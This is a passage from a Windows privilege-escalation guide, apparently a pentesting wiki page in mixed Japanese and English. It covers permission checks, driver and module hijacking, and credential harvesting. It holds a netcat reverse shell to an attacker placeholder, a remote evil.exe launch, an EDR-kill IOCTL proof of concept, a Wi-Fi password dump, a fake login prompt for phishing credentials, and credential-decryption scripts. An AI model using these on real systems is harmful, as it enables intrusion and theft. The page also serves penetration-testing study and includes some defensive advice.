Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

一部の config file を変更して特定の special file を read できるか、または Administrator account によって実行される binary を変更できるかを確認します (schedtasks)。

システム内で弱い folder/files permissions を見つける方法の一つは、次のとおりです:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` のサブフォルダ内にある任意の plugin DLL を autoload します。書き込み可能な portable/copy install が存在する場合、悪意ある plugin を配置すると、起動のたびに `notepad++.exe` 内で自動的に code execution できます（`DllMain` や plugin callbacks からも可能）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**別のユーザーによって実行される registry や binary を上書きできるか確認してください。**\
**以下のページを読んで、権限昇格に使える興味深い **autoruns locations** について学んでください:**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

可能性のある **third party weird/vulnerable** drivers を探してください
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Some drivers accept a registry path from userland, validate only that it is a sane UTF-16 string, and then call `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` with `RTL_QUERY_REGISTRY_DIRECT` into a stack scalar such as `int readValue`. If `RTL_QUERY_REGISTRY_TYPECHECK` is missing, `EntryContext` is interpreted according to the **actual** registry type, not the type the developer expected.

This creates two useful primitives:

- **Confused deputy / oracle**: a user-controlled absolute `\Registry\...` path lets the driver query attacker-chosen keys, leak existence through return codes/logs, and sometimes read values the caller could not access directly.
- **Kernel memory corruption**: a scalar destination such as `&readValue` becomes type-confused as a `REG_QWORD`, `UNICODE_STRING`, or sized binary buffer depending on the registry value type.

Practical exploitation notes:

- **Windows 8+ mitigation**: if the query hits an **untrusted hive** with `RTL_QUERY_REGISTRY_DIRECT` but without `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers crash with `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. To keep exploitability, look for **attacker-writable keys inside trusted system hives** instead of staging values under `HKCU`.
- **Trusted-hive staging**: use NtObjectManager to enumerate writable descendants of `\Registry\Machine`, and re-run the scan with a duplicated **low-integrity** token to find keys reachable from sandboxed contexts:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 8バイトの直接書き込みが 4バイトの `int` を上書きすると、隣接するスタックデータが破壊され、近くの callback/function pointer を部分的に上書きできる。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode では `EntryContext` が `UNICODE_STRING` を指していることを前提とする。コードが最初に attacker-controlled な `REG_DWORD` をスタック上のスカラーに読み込み、その後同じバッファを string read に再利用すると、attacker は `Length`/`MaximumLength` を制御し、`Buffer` ポインタにも部分的に影響を与え、半制御の kernel write を実現できる。
- **`REG_BINARY`**: 大きな binary data の場合、direct mode は `EntryContext` の先頭の `LONG` を signed buffer size として扱う。もし前の `REG_DWORD` 読み取りで再利用されたスカラーに attacker-controlled な **負の** 値が残っていると、次の `REG_BINARY` query は attacker bytes を隣接する stack slot に直接コピーし、これはしばしば callback-pointer overwrite まで到達する最もきれいな経路となる。

強い hunting pattern: **再初期化せずに同じ stack variable へ異なる種類の registry read を行うこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される `EntryContext` ポインタ、そして最初の registry read が次の read を実行するかどうかを制御する code path を grep せよ。

#### device object における FILE_DEVICE_SECURE_OPEN の欠落を悪用する (LPE + EDR kill)

一部の署名済み third-party drivers は、強い SDDL を使って IoCreateDeviceSecure で device object を作成するが、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れる。この flag がないと、追加の component を含む path 経由で device を開いた場合に secure DACL が適用されない。そのため、任意の非特権ユーザーは次のような namespace path を使って handle を取得できる:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際の事例より)

ユーザーが device を開けるようになると、driver が公開している privileged IOCTLs を悪用して LPE や tampering が可能になる。現場で観測された能力の例:
- 任意の process に full-access handles を返す (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser)。
- 制限のない raw disk read/write (offline tampering, boot-time persistence tricks)。
- 任意の process を terminate する。Protected Process/Light (PP/PPL) も含むため、kernel 経由で user land から AV/EDR kill が可能になる。

最小 PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの対策
- DACLで制限されることを意図した device objects を作成する際は、常に FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作の前に caller context を検証する。process termination や handle return を許可する前に PP/PPL チェックを追加する。
- IOCTLs を制限する（access masks、METHOD_*、input validation）し、直接的な kernel privileges の代わりに brokered models を検討する。

防御者向けの検知アイデア
- 疑わしい device names への user-mode opens（例: \\ .\\amsdk*）と、悪用を示唆する特定の IOCTL sequences を監視する。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、自前の allow/deny lists を維持する。


## PATH DLL Hijacking

PATH 上にある folder 内で **write permissions** を持っている場合、process によって loaded される DLL を hijack して **escalate privileges** できる可能性がある。

PATH 内のすべての folder の permissions を確認する:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` 経由の Node.js / Electron module resolution hijacking

これは **Windows uncontrolled search path** の変種で、**Node.js** と **Electron** アプリケーションが `require("foo")` のような bare import を行い、期待される module が **missing** の場合に影響します。

Node はディレクトリツリーを上方向にたどり、各親ディレクトリで `node_modules` フォルダを確認して package を解決します。Windows ではその探索が drive root まで到達できるため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、最終的に次を調査することになります:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**low-privileged user** が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（または package folder）を配置し、**higher-privileged Node/Electron process** が missing な依存関係を解決するのを待つことができます。payload は被害プロセスの security context で実行されるため、対象が administrator として実行されている場合、昇格された scheduled task/service wrapper 経由の場合、または自動起動する privileged desktop app の場合、これは **LPE** になります。

これは特に次のような場合に一般的です:

- 依存関係が `optionalDependencies` に宣言されている
- サードパーティ library が `require("foo")` を `try/catch` でラップし、失敗しても処理を継続する
- package が production build から削除された、packaging 時に含まれなかった、またはインストールに失敗した
- 脆弱な `require()` が main application code ではなく dependency tree の深い場所にある

### 脆弱な target の探し方

**Procmon** を使って resolution path を確認します:

- `Process Name` を target executable（`node.exe`、Electron app の EXE、または wrapper process）にフィルタリングする
- `Path` を `contains` `node_modules` にフィルタリングする
- `NAME NOT FOUND` と、`C:\node_modules` 配下での最後の successful open に注目する

展開された `.asar` ファイルや application sources で有用な code-review pattern:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### エクスプロイテーション

1. Procmon またはソースレビューから **missing package name** を特定します。
2. まだ存在しない場合は、root lookup directory を作成します:
```powershell
mkdir C:\node_modules
```
3. 期待される正確な名前の module を配置する:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害アプリケーションを起動する。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性がある。

このパターンに当てはまる、実際に存在する欠落した optional modules の例として `bluebird` や `utf-8-validate` があるが、**technique** として重要なのは再利用できる点だ。特権のある Windows Node/Electron プロセスが解決する **missing bare import** を見つければよい。

### Detection and hardening ideas

- ユーザーが `C:\node_modules` を作成したり、そこに新しい `.js` ファイルや package を書き込んだりしたときに alert する。
- `C:\node_modules\*` から読み取りを行う high-integrity processes を hunt する。
- 本番環境では実行時依存関係をすべて package 化し、`optionalDependencies` の使用を audit する。
- サードパーティコードの、無言の `try { require("...") } catch {}` パターンを review する。
- ライブラリが対応している場合は optional probe を disable する（たとえば、`ws` の一部の deployment では `WS_NO_UTF_8_VALIDATE=1` により legacy の `utf-8-validate` probe を回避できる）。

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされている、他の既知のコンピュータがないか確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

外部から **restricted services** を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARPテーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Firewall related commandsはこちらのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **(rulesの一覧表示、rulesの作成、無効化、無効化...)**

ネットワーク列挙のための[より多くの commandsはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも見つかります

root user を取得できれば、任意のポートで listen できます（`nc.exe` を初めてポートで listen するために使うとき、`nc` を firewall で許可するかどうかを GUI で確認されます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
root として bash を簡単に起動するには、`--default-user root` を試せます

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダで `WSL` のファイルシステムを調べられます

## Windows 資格情報

### Winlogon 資格情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault は、**Windows** がユーザーを自動的に**log in**できるサーバー、websites、その他の programs 用の user credentials を保存します。最初は、これによりユーザーが Facebook の credentials、Twitter の credentials、Gmail の credentials などを保存でき、browser 経由で自動的に log in できるようになるように見えるかもしれません。ですが、そうではありません。

Windows Vault は、Windows がユーザーを自動的に log in できる credentials を保存します。つまり、**resource にアクセスするための credentials が必要な Windows application** は、この Credential Manager と Windows Vault を利用し、ユーザーが毎回 username と password を入力する代わりに、提供された credentials を使うことができます。

application が Credential Manager とやり取りしない限り、特定の resource に対する credentials を使うことはできないと思います。したがって、application が vault を利用したい場合は、何らかの方法で **credential manager と通信し、default storage vault からその resource の credentials を要求する** 必要があります。

`cmdkey` を使って、machine 上に保存されている credentials を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Then `runas` を `/savecred` オプションとともに使用して、保存された認証情報を使うことができます。以下の例では、SMB share 経由で remote binary を呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas` を指定された資格情報セットで使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** は、データの対称暗号化を行うための方法を提供し、主に Windows オペレーティングシステム内で非対称秘密鍵の対称暗号化に使用されます。この暗号化は、ユーザーまたはシステムの secret を利用してエントロピーを大きく高めます。

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. システム暗号化に関するシナリオでは、システムのドメイン認証 secret を利用します。

DPAPI を使用して暗号化されたユーザーの RSA keys は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**ユーザーの private keys を同じファイル内で保護する master key と同じ場所に置かれる DPAPI key** は、通常 64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されており、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
You can use **mimikatz module** `dpapi::masterkey` with the appropriate arguments (`/pvk` or `/rpc`) to decrypt it.

The **credentials files protected by the master password** are usually located in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された credentials を便利に保存する方法として、**scripting** や automation tasks でよく使われます。credentials は **DPAPI** を使って保護されており、通常は作成されたのと同じ computer 上の同じ user だけが decrypt できます。

ファイルに保存された PS credentials を **decrypt** するには、次のようにします:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存されたRDP接続

これらは `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります

### 最近実行したコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します .\
インストーラは **SYSTEM privileges** で **実行** され、多くは **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**)** に脆弱です。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Files and Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` の中に保存されていることがあるので、そこに何か興味深いものがないか確認すべきです:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかれば、それはおそらく保存された SSH key です。これは暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この technique の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` service が実行されていない場合で、boot 時に自動起動させたいなら、次を実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。いくつかの ssh keys を作成し、それらを `ssh-add` で追加して、ssh 経由で machine に login してみました。registry HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも asymmetric key authentication 中に `dpapi.dll` の使用は確認できませんでした。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit**: _post/windows/gather/enum_unattend_ を使ってこれらのファイルを検索することもできます。

例:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索します

### Cached GPP Pasword

以前、Group Policy Preferences (GPP) を使って、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。  
しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存される Group Policy Objects (GPOs) は、任意のドメインユーザーがアクセスできました。次に、これらの GPP 内のパスワードは、公開文書化されたデフォルトキーを使って AES256 で暗号化されていましたが、認証済みユーザーなら誰でも復号できました。これは、ユーザーが権限を昇格できる可能性があるため、深刻なリスクでした。

このリスクを軽減するため、空でない "cpassword" フィールドを含むローカルにキャッシュされた GPP ファイルをスキャンする関数が作成されました。そのようなファイルが見つかると、この関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには GPP とファイルの場所に関する詳細が含まれており、このセキュリティ脆弱性の特定と修正に役立ちます。

これらのファイルを `C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ で検索します:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使ってパスワードを取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 資格情報を求める

必要であれば、**ユーザーに自身の資格情報を入力させる**ことも、あるいは**別のユーザーの資格情報**であっても、その人が知っていると思うなら尋ねることができます（ただし、クライアントに直接**資格情報**を**尋ねる**のは本当に**リスクが高い**ことに注意してください）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **資格情報を含む可能性のあるファイル名**

以前、**平文**または**Base64**で**passwords**を含んでいたことがある既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
